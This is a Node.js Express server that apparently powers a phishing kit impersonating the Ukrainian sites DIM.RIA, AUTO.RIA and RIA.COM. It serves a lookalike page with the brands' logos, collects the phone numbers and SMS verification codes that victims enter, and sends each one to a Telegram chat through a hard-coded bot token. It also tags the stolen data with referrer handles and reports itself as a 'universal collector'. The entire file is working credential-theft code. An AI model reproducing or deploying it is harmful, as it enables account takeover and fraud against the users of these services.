const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ЛОГОТИПЫ ДЛЯ КАЖДОГО ПРОЕКТА ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://play-lh.googleusercontent.com/7kD9z2fW1oG6L9g5Z9v2r3v1q7t8y5u4i3o2p1l0k9j8h7g6f5e4d3c2b1a0z9y8x7w6v5",
    ria: "https://play-lh.googleusercontent.com/1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7"
};

// === ГЛАВНАЯ СТРАНИЦА С ПАРАМЕТРОМ project ===
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

// === СТАТИЧЕСКИЙ ФАЙЛ: ЛОГО ДИНАМИЧЕСКИ ===
app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

// === ПАНЕЛЬ УПРАВЛЕНИЯ ===
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// === ОТПРАВКА В TELEGRAM ===
async function sendToTelegram(message) {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                timeout: 10000
            });
            const result = await res.json();
            if (res.ok && result.ok) return true;
            console.error('Telegram error:', result);
            if (result.error_code === 403) return false;
        } catch (err) {
            console.error(`Попытка ${i + 1}:`, err.message);
            if (i === 2) return false;
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    return false;
}

// === ОБРАБОТКА ФОРМЫ ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, referrer, project = 'dimria' } = req.body;

    const projectNames = { dimria: 'DIM.RIA', autoria: 'AUTO.RIA', ria: 'RIA.COM' };
    const projectName = projectNames[project] || 'DIM.RIA';

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Країна:* Україна`;
        if (referrer) message += `\n*Реферал:* @${referrer}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS КОД:* \`${code}\`\n*ПРОЕКТ:* ${projectName}`;
        if (referrer) message += `\n*Реферал:* @${referrer}`;
    } 
    else {
        return res.status(400).json({ success: false });
    }

    const ok = await sendToTelegram(message);
    res.json({ success: ok });
});

// === ТЕСТ ПРИ СТАРТЕ ===
app.listen(PORT, () => {
    console.log(`Сервер: http://localhost:${PORT}`);
    console.log(`Панель: http://localhost:${PORT}/panel`);
    setTimeout(() => {
        sendToTelegram(`*УНІВЕРСАЛЬНИЙ КОЛЕКТОР ЗАПУЩЕНО* ✅\nПроекти: DIM.RIA / AUTO.RIA / RIA.COM`);
    }, 3000);
});
